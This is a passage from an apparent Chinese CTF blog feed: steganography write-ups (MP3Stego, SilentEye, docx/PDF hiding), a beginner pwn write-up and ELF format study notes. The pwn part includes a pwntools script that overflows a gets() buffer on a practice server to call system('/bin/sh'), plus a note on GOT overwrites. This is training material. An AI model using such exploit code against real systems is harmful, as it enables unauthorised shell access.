class="code"><pre><span class="line">Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???</span><br></pre></td></tr></table></figure><p>base64 &amp;&amp; base32 后得到 flag：</p><p>none</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: IwtsqndljERbd367cbxf32gg</span><br></pre></td></tr></table></figure><h2 id="5、SilentEye"><a href="#5、SilentEye" class="headerlink" title="5、SilentEye"></a>5、SilentEye</h2><p>考察点</p><ul><li>SilentEye 工具的了解使用</li></ul><p>工具</p><ul><li><a href="https://achorein.github.io/silenteye/">SilentEye官网</a></li><li><a href="/image/media/2022/misc/silenteye-0.4.1-win32.zip">SilentEye本地版本</a></li></ul><p>SilentEye 是一个跨平台的应用程序设计，可以轻松地使用隐写术，在这种情况下，可以将消息隐藏到图片或声音中。它提供了一个很好的界面，并通过使用插件系统轻松集成了新的隐写算法和加密过程。</p><p>Writeup</p><p>直接使用 slienteye 这个工具即可 ：</p><p><img src="/image/media/2022/misc/7.png"></p><h2 id="6、综合"><a href="#6、综合" class="headerlink" title="6、综合"></a>6、综合</h2><p>工具</p><ul><li><a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego官网</a></li><li><a href="/image/media/2022/misc/MP3Stego_1_1_19.zip">MP3stego本地链接版本</a></li><li>Linux xxd 命令</li><li>Linux file 命令</li></ul><p>Writeup</p><p>解压 mp3，首先使用 Mp3Stego解密 mp3 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">D:\soft\MP3Stego_1_1_18\MP3Stego</span><br><span class="line">λ Decode.exe -X C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3</span><br><span class="line">MP3StegoEncoder 1.1.17</span><br><span class="line">See README file <span class="keyword">for</span> copyright info</span><br><span class="line">Input file = <span class="string">&#x27;C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3&#x27;</span>  output file = <span class="string">&#x27;C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3.pcm&#x27;</span></span><br><span class="line">Will attempt to extract hidden information. Output: C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3.txt</span><br><span class="line">Enter a passphrase:</span><br><span class="line">Confirm your passphrase:</span><br><span class="line">the bit stream file C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3 is a BINARY file</span><br><span class="line">HDR: s=FFF, <span class="built_in">id</span>=1, l=3, ep=off, br=9, sf=0, pd=1, <span class="built_in">pr</span>=0, m=0, js=0, c=0, o=0, e=0</span><br><span class="line">alg.=MPEG-1, layer=III, tot bitrate=128, sfrq=44.1</span><br><span class="line">mode=stereo, sblim=32, jsbd=32, ch=2</span><br><span class="line">[Frame 1265]Avg slots/frame = 417.631; b/smp = 2.90; br = 127.899 kbps</span><br><span class="line">Decoding of <span class="string">&quot;C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3&quot;</span> is finished</span><br><span class="line">The decoded PCM output file name is <span class="string">&quot;C:\Users\CTF\Desktop\CTF\misc\hong_Ksfw02V.mp3.pcm&quot;</span></span><br></pre></td></tr></table></figure><p>得到一个 txt 文件内容是:</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//weibo.com/u/5280474214?from=feed&amp;loc=avatar&amp;is_all=1      hint:这是一个文件哦，呦呦呦，切克闹</span></span><br></pre></td></tr></table></figure><p>访问得到一张二维码：</p><p><img src="/image/media/2022/misc/8.png"></p><p>读取二维码得到内容为:</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">03</span>F30D0AC252BA576300000000000000000100000040000000730D0000006400008400005A00006401005328020000006300000000030000000F000000430000007363000000640100640200640300640400640500640600640400640700640800640300640400640900640300640900640A00670F007D0000640B007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100714000577C0100474864000053280C0000004E697A00000069680000006969000000695F0000006966000000697500000069730000006961000000696E0000006967000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000622E70795203000000010000007326000000000103010301030103010301030103010301030103010301030103010301090106010D0114024E280100000052030000002800000000280000000028000000007304000000622E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure><p>将二进制内容保存文件为<code>gg</code>，然后用<code>xxd</code>命令生成一个 hex 文件：</p><p><img src="/image/media/2022/misc/9.png"></p><p>用 file 命令查看下是一个 python 2.7的编译文件，手动改为 hex.pyc然后在线反编译一下文件得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="built_in">str</span> = [</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">105</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">102</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">97</span>,</span><br><span class="line">        <span class="number">105</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">105</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">103</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>代码最后加上<code>flag()</code>调用 flag 函数输出 flag：</p><p><img src="/image/media/2022/misc/10.png"></p><h2 id="7、mp3文件private-bit隐写"><a href="#7、mp3文件private-bit隐写" class="headerlink" title="7、mp3文件private bit隐写"></a>7、mp3文件private bit隐写</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import binascii</span><br><span class="line">n = 235986</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">fina = &#x27;&#x27;</span><br><span class="line">number = 0</span><br><span class="line">list = [0,1,26,50,75,99,124,148,173,197,222,246,271,295,320,344,369,393,418]</span><br><span class="line">file = open(&#x27;cb1bc8789569146483da7bd65ee4a063.mp3&#x27;,&#x27;rb&#x27;)</span><br><span class="line">while n &lt; 1369844 :</span><br><span class="line">    file.seek(n,0)</span><br><span class="line">    if number in list:</span><br><span class="line">        n += 417</span><br><span class="line">    else:</span><br><span class="line">        n += 418</span><br><span class="line">    file_read_result = file.read(1)</span><br><span class="line">    read_content = bin(ord(file_read_result))[-1]</span><br><span class="line">    result = result + read_content</span><br><span class="line">    number += 1</span><br><span class="line">#print result</span><br><span class="line"></span><br><span class="line">fina = &#x27;&#x27;</span><br><span class="line">textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span><br><span class="line"># textArr.append(result[(len(textArr)*8):])</span><br><span class="line">for i in textArr:</span><br><span class="line">    fina = fina + chr(int(i,2)).strip(&#x27;\n&#x27;)</span><br><span class="line">print fina</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="四、电子文档隐写"><a href="#四、电子文档隐写" class="headerlink" title="四、电子文档隐写"></a>四、电子文档隐写</h1><h2 id="1、隐藏文字"><a href="#1、隐藏文字" class="headerlink" title="1、隐藏文字"></a>1、隐藏文字</h2><h3 id="利用隐藏文本功能进行隐写"><a href="#利用隐藏文本功能进行隐写" class="headerlink" title="利用隐藏文本功能进行隐写"></a>利用隐藏文本功能进行隐写</h3><p>首先打开，flag.doc<br>打开flag.doc，能看到的文字内容只有<code>Flag in here。</code>,我们就可以猜测，flag是被隐藏起来了</p><p><img src="/image/media/2022/misc/12.png"></p><p>开启隐藏文字显示功能，查看flag是否被隐写</p><p>word文档在此处</p><p><img src="/image/media/2022/misc/2.jpg"></p><p>wps在菜单栏中，找到文件，移动鼠标到工具一栏，选择选项功能。</p><p><img src="/image/media/2022/misc/13.png"></p><p>在弹出来的菜单栏中，找到隐藏文字功能，选择使其打上对勾。</p><p><img src="/image/media/2022/misc/11.png"></p><p>点击确定，回到文字编辑界面就能看到flag了。</p><h3 id="word文档的xml转换"><a href="#word文档的xml转换" class="headerlink" title="word文档的xml转换"></a>word文档的xml转换</h3><p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被隐藏进其他数据。</p><p>首先，找到文件并打开文件查看</p><p><img src="/image/media/2022/misc/14.png"></p><p>尝试分离文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+bash-4.3$ file file.docx </span><br><span class="line">file.docx: Zip archive data, at least v2.0 to extract</span><br><span class="line">+bash-4.3$ 7z x file.docx -oout</span><br><span class="line"></span><br><span class="line">7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18</span><br><span class="line">p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)</span><br><span class="line"></span><br><span class="line">Processing archive: file.docx</span><br><span class="line"></span><br><span class="line">Extracting  word/numbering.xml</span><br><span class="line">Extracting  word/settings.xml</span><br><span class="line">Extracting  word/fontTable.xml</span><br><span class="line">Extracting  word/styles.xml</span><br><span class="line">Extracting  word/document.xml</span><br><span class="line">Extracting  word/_rels/document.xml.rels</span><br><span class="line">Extracting  _rels/.rels</span><br><span class="line">Extracting  [Content_Types].xml</span><br><span class="line">Extracting  flag.txt</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br></pre></td></tr></table></figure><p>我们会发现又flag.txt的文件被打包在file.docx中，直接用7z等压缩包工具打开file.docx</p><p><img src="/image/media/2022/misc/15.png"></p><p>打开，flag.txt文件，就能看到flag了。</p><h2 id="2、文件隐藏"><a href="#2、文件隐藏" class="headerlink" title="2、文件隐藏"></a>2、文件隐藏</h2><p>PDF隐写中，我们最常用，也是最熟知的工具就是wbStego4open,这是可以把文件隐藏到BMP，TXT,HTM和PDF文件中的工具，当然，这里我们只用他来最为以PDF为载体进行隐写的工具。</p><p>在工具目录中找到 wbStego4open，使用工具载入文档，</p><p>Step 1 是文件介绍</p><p>Step 2 中，我们选择Decode，</p><p>Step 3 我们选择目标文件</p><p>Step 4 输入加密密码，这里我是空密码，直接跳过</p><p>Step 5 为保存文件为 flag.txt</p><p>最后打开保存后的文件，flag.txt，就能得到flag了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CTF MISC 这块还是建议大家靠兴趣去刷题，因为学这玩意出来不一定可以找到工作，如果不是真正喜欢这个，不建议大家去做专职的 MISC 手，CTF 竞赛中二进制是主力，Web 次之。就业方面 Web 就业机会要多于二进制，MISC、密码学这里的方向就业岗位真的不多，所以还是建议 Web 手或者二进制手兼职刷一些 MISC 题目，不要主次颠倒了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn第一道题目</title>
      <link href="/article/2021-11-25-pwn%E7%AC%AC%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/"/>
      <url>/article/2021-11-25-pwn%E7%AC%AC%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>记录第一次尝试做pwn题目。</p><span id="more"></span><h1 id="1-访问题目"><a href="#1-访问题目" class="headerlink" title="1.访问题目"></a>1.访问题目</h1><p>这里选择的是buuctf在线测评上面的rip题目，下载到一个附件和一个nc链接</p><p><img src="/image/media/2022/pwn_rip/1.jpg"></p><p>首先在Ubuntu里nc访问一下这个端口</p><p><img src="/image/media/2022/pwn_rip/2.jpg"></p><p>直接运行这个文件</p><p><img src="/image/media/2022/pwn_rip/3.jpg"></p><p>总结下来大概就是能够进行一次输入并接受值然后输出，并附带了两个友情提示之类的字符串输出，然后可能在接受的时候存在溢出的可能性。</p><h1 id="2-收集信息"><a href="#2-收集信息" class="headerlink" title="2.收集信息"></a>2.收集信息</h1><h3 id="2-1checksec"><a href="#2-1checksec" class="headerlink" title="2.1checksec"></a>2.1checksec</h3><p>使用checksec查看安全机制：checksec ./pwn1    (checksec filename)</p><p><img src="/image/media/2022/pwn_rip/4.jpg"></p><h3 id="补充备注："><a href="#补充备注：" class="headerlink" title="补充备注："></a>补充备注：</h3><h4 id="Arch"><a href="#Arch" class="headerlink" title="Arch:"></a>Arch:</h4><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Partial RELRO（部分）：容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell</span><br><span class="line">FULL RELRO（完全）：使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</span><br></pre></td></tr></table></figure><h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过。</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PTE（Position-Independent Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时泄露地址信息。</p><h4 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h4><p>程序运行是的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击，实例：攻击案例</p><h4 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h4><p>这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误<br>简单地说，加了和这个保护之后，一些敏感函数如read,fgets,memcpy,printf等等可能导致漏洞出现的函数会替换成<code>__read_chk,__fgets_chk</code>等。<br>这些带了chk的函数 会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串卫视是否位于可能被用户修改的可写地址，避免了格式胡字符串跳过某些函数如直接(%7$x)等方式来避免漏洞出现，开启FORTIFT保护的程序会被checksec检出，此外，在反编译是直接查看got表也会发现chk函数的存在，这种检查是默认不开启的，可以通过。</p><h3 id="2-2-ida反编译"><a href="#2-2-ida反编译" class="headerlink" title="2.2 ida反编译"></a>2.2 ida反编译</h3><p>用ida反汇编，可以看到是gets函数有个简单的栈溢出，偏移也很好计算，F+8=23（后面补充原因）</p><p><img src="/image/media/2022/pwn_rip/5.jpg"></p><p>反编译之后可以看到main函数的主要代码片段。</p><p><img src="/image/media/2022/pwn_rip/6.jpg"></p><p>此处能看到s字符串的长度是15位。</p><p><img src="/image/media/2022/pwn_rip/8.jpg"></p><p><img src="/image/media/2022/pwn_rip/9.jpg"></p><p>此外还发现一个fun函数可以直接跳转到这里来获取shell。</p><p><img src="/image/media/2022/pwn_rip/7.jpg"></p><p>system函数可以接受参数。</p><h3 id="2-3payload"><a href="#2-3payload" class="headerlink" title="2.3payload"></a>2.3payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#python3 需要预先安装pwntools</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;27532&#x27;) </span><br><span class="line">payload = b&#x27;a&#x27; * (0xf + 8) + p64(0x40118A) #这个b是转换为字节流，python3特色 </span><br><span class="line">#这个15+8 好像很神奇的样子，有点玄虚在里面</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()      </span><br></pre></td></tr></table></figure><p>解释：get函数最后必有一个retn 返回调用地址。堆栈平衡什么的。</p><p>0x40118A就是劫持的一个目标函数地址，就是在在上面fun函数中对应的/bin/sh的位置。</p><p>使得get 返回了0x40118A，而不是main 中调用get 后的地址。</p><p>retn相当于pop + 执行，故形成了返回地址劫持。</p><p>效果是：pop 堆栈 ebp,esp 这里记不清了，应该是这两个寄存器中的一个，0x40118A<br>等价为：</p><p>pop 堆栈</p><p>call system(“/bin/sh”)</p><h1 id="3-解释备注"><a href="#3-解释备注" class="headerlink" title="3.解释备注"></a>3.解释备注</h1><p>这个就是15+8的来历</p><p>15是s的长度，8是因为64位的系统</p><p>我们这边要造成溢出利用，就得要从变量那边写数据，溢出到返回地址，这需要输入的字符串的长度=变量大小+ebp</p><p>32位程序的ebp的大小是4，64位程序的ebp的大小是8</p><p>前面使用checksec命令查看文件的信息，是64位。64位就是8byte</p><h3 id="3-1pwntools"><a href="#3-1pwntools" class="headerlink" title="3.1pwntools"></a>3.1pwntools</h3><p>send(data): 发送数据</p><p>sendline(data) : 发送一行数据，相当于在末尾加\n</p><p>recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时</p><p>recvuntil(delims, drop=False) : 接收到delims的pattern （以下可以看作until的特例）</p><p>recvline(keepends=True) : 接收到\n，keepends指定保留\n</p><p>recvall() : 接收到EOF</p><p>recvrepeat(timeout=default) : 接收到EOF或timeout</p><p>interactive() : 与shell交互</p><p>连接：本地process()、远程remote(ip,port)，对于remote函数可以接url并且指定端口</p><p>数据处理：主要是对整数进行打包：p32、p64是打包为二进制，u32、u64是解包为二进制</p><p>IO模块：这个比较容易跟zio搞混，记住zio是read、write，pwn是recv、send</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译过程和elf文件</title>
      <link href="/article/2021-11-25-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%E5%92%8Celf%E6%96%87%E4%BB%B6/"/>
      <url>/article/2021-11-25-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%E5%92%8Celf%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文介绍二进制文件编译过程和elf文件。</p></blockquote><span id="more"></span><h1 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h1><p>编译过程：可分为五个阶段：</p><ul><li>1.词法分析</li><li>2.语法分析</li><li>3.语义分析</li><li>4.中间代码生成和优化</li><li>5.代码生成和优化</li></ul><h2 id="gcc编译过程"><a href="#gcc编译过程" class="headerlink" title="gcc编译过程"></a>gcc编译过程</h2><p>gcc编译过程主要包括四个：</p><ul><li>1.预处理</li><li>2.编译</li><li>3.汇编</li><li>4.链接</li></ul><p>使用了cc1、as、collect2三个工具，最后生成的是(静态｜动态)的可执行文件</p><ul><li>生成的汇编代码中函数printf()被替换成puts()，因为当printf()只有单一参数时与puts()十分相似，gcc的优化策略酒将其替换以便提高性能。</li></ul><h1 id="ELF-可执行可链接-文件格式"><a href="#ELF-可执行可链接-文件格式" class="headerlink" title="ELF(可执行可链接)文件格式"></a>ELF(可执行可链接)文件格式</h1><p>ELF文件可以分为三种类型：</p><ul><li>可执行文件(.exec)</li><li>可重定位文件(.rel)</li><li>共享目标文件(.dyn)</li></ul><p>1.可执行文件(executable file):经过链接、可执行的目标文件，通常也被称为程序。</p><p>2.可重定向文件(relocatable file):由原文件编译而成且尚未链接的目标文件，通常以”.o”作为扩展名。用于与其他目标文件进行链接以构成可执行文件或动态链接库，通常是一段位置独立的代码(Position Independent Code,PIC)。</p><p>3.共享目标文件(shared object flie):动态链接库文件。用于在链接过程中与其他动态链接库或可重定向文件一起构建新的目标文件，或者在可执行文件加载时，链接到进程中作为运行代码的一部分。</p><p>除了上面说的三种类型，核心转储文件(Core Dmp file)作为进程意外终止时进程地址空间的转储，也是ELF文件的一种。</p><p>使用gdb读取这类文件可以辅助调试和查找程序崩溃的原因。</p><h1 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h1><p>ELF文件被统称为Object file。后面提到目标文件时，指各种ELF文件。</p><p>(.o)文件直接称为可重定向文件，由于这类文件包含了代码和饿数据，可以被用于链接成可执行文件或者共享目标文件。</p><p>查看目标文件时候有两种视角可以选择：</p><ul><li>链接视角，通过节(Section)来划分</li><li>运行视角，通过段(Segment)来划分</li></ul><h1 id="链接视角"><a href="#链接视角" class="headerlink" title="链接视角"></a>链接视角</h1><p>通常目标文件都会包含:代码(.text)、数据(.data)、BSS(.bss)这3个节，其中代码节用于保存可执行的机器指令，数据节用于已初始化的全局变量和局部静态变量，BSS节则用于保存未初始化的全局变量和局部静态变量。</p><p>除了上述的三个节，简化的目标文件应包含一个文件头(ELF header)。</p><p>将程序指令和数据分开的好处是：从安全的角度上，当程序加载后，数据和指令分别被映射到两个虚拟区域，由于数据区域对进程来说是可读可写的，而指令区域对进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，方杂志程序的指令被改写和利用。</p><h2 id="ELF文件头"><a href="#ELF文件头" class="headerlink" title="ELF文件头"></a>ELF文件头</h2><p>ELF文件头(ELF header)位于目标文件最开始的位置，包含描述整个文件的一些基本信息：ELF文件类型、版本/ABI版本、目标机器、程序入口、段表和节表的位置和长度等。</p><p>文件头部存在魔术字符(7f 45 4c 46)，即字符串”\177ELF”,当文件被映射到内存是，可以通过搜索该字符确定映射地址。</p><h2 id="节头表"><a href="#节头表" class="headerlink" title="节头表"></a>节头表</h2><p>一个目标文件包含了许多节，这些信息都保存在节头表中，表的每一项都是一个Elf64_Shdr(也称节描述符)，记录了节的名字、长度、偏移、读写权限等信息。节头表的位置记录在文件头的e_shoff域中。节头表对于程序运行不是必须的，应为它与程序内存布局无关，是程序头表的任务，所以常用程序去除节头表，以便增加反编译的难度。</p><h3 id="代码节"><a href="#代码节" class="headerlink" title="代码节"></a>代码节</h3><p>代码节(.text)</p><p>objdump -x -s -d xxxx(文件名)</p><p>Content of section .text部分是.text数据的十六进制形式。</p><ul><li>3、Size表示总共有多少个字节。</li><li>1、Idx表示偏移量</li><li>2、Name表示节的名称</li><li>4、VMA和LMA在中间表示内容</li></ul><p>Disassembly of section .text部分则是反编译的结果。</p><h3 id="数据节"><a href="#数据节" class="headerlink" title="数据节"></a>数据节</h3><p>数据节(.data)       只读数据节(.rodata)</p><p>数据节(.data)可以看到已经保存的初始化的全局变量和局部静态变量</p><p>Content of section .data</p><p>global_init_var(0a000000)和local_static_init_var(14000000)，每一个变量四个字节</p><p>只读数据节(.rodata)可以看到已经保存的只读数据，包括只读变量和字符串常量。</p><p>源代码调用printf()函数时，用到了一个”%d\n”，他是一种只读数据。</p><p>Content of section .rodata</p><p>可以看到字符串常量的ASCII形式，以’\0’结尾。</p><h3 id="BSS节"><a href="#BSS节" class="headerlink" title="BSS节"></a>BSS节</h3><p>用于保存未初始化的群居变量和局部静态变量。</p><h2 id="常用的表"><a href="#常用的表" class="headerlink" title="常用的表"></a>常用的表</h2><ul><li>字符串表：包含以null结尾的字符序列用来表示符号名和节名，引用字符串时只需要给出字符序列在表中的便宜偏移即可，字符串表的第一个字符和最后一个字符都是null字符，以确保所有字符串都有开始和终止。</li><li>符号表：记录了目标文件中所用到的所有符号信息，通常为.dynsym和.symtab，前者是后者的子集。在.dynsym中保存了引用自外部文件的符号，只能在运行是被解析，而在.symtab中还保存了本地符号，用于调试和链接。目标文件通过一个符号在表中的索引值来使用该符号，索引值从0开始计数，但值为0的表项不具有实际的意义，他表示为定义的符号。每个符号都有一个符号值(symbol value)。对于常量和函数，该值就是符号的地址。</li><li>重定位是链接符号定义和符号引用的过程。可重定位文件在构建可执行文件或共享目标文件时，需要把节中的符号引用换成这些符号在进程中虚拟地址，包含这些转换信息的数据就是重定位项(relocation entries)</li></ul><p>在Elf64_Rel和Elf64_Rela结构体中：</p><ul><li>r_offset是在重定向时需要被修改的符号偏移。</li><li>r_info分为两个部分：type指示如何修改引用，symbol指示应该修改引用为那个符号。</li><li>r_addend用于对被修改的引用做偏移调整。</li></ul><h1 id="运行视角"><a href="#运行视角" class="headerlink" title="运行视角"></a>运行视角</h1><p>当执行一个可执行文件时，首先需要将该文件盒动态链接库装载到进程空间中，形成一个进程镜像，每个进程都有独立的虚拟地址空间，这个空间如何布局是由记录在段头表中的程序头决定的。</p><h2 id="常用的段"><a href="#常用的段" class="headerlink" title="常用的段"></a>常用的段</h2><p>通常一个可执行文件至少有一个PT_LOAD类型的段，用于描述可装载的段，而动态链接的可执行文件则包含两个，将.data 和.text分开存放。</p><p>动态段PT_DYNAMIC包含了一些动态链接器所必须段信息，如共享库列表、GOT表和重定向表等。</p><p>PT_NOTE类型的段保存了系统相关的附加信息，虽然程序运行并不需要这些。</p><p>PT_INTERP段将位置信息和大小信息存放在一个字符串中，是对程序解释器位置的描述。</p><p>PT_PHDR段保存了程序头表本身的位置和大小。</p><h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>编译时链接、加载时链接、运行时链接</p><p>将两个目标文件链接成一个可执行文件时使用两种方法：按序叠加、相似节合并</p><p>为了构造可执行文件，链接器必须完成两个工作：符号解析(symbol resolution)和重定向(relocation)</p><ul><li>符号解析就是将每个符号(函数、全局变量、静态变量)的引用于其定义进行关联。</li><li>重定向就是将每个符号的定义与一个内存地址进行关联，然后修改这些符号的引用，使其指向这个内存地址。</li></ul><p>1.使用objdump可以查看文件各个节的详细信息:</p><p>objdump -h main.o</p><p>objdump -h func.ELF</p><p>VMA(Virtual Memory Address)是虚拟地址，LMA(Load Memoey Address)是加载地址。</p><p>2.使用odjdump可以查看文件的反汇编代码，参数”-mi386:intel”表示以Intel格式输出。</p><p>odjdump -d -M intel –section=.text main.o</p><p>3.可重定向文件中最重要的就是包含重定位表，用于告诉链接器如何修改节的内容，每一个重定位表对应一个需要被重定位的节</p><p>odjdump 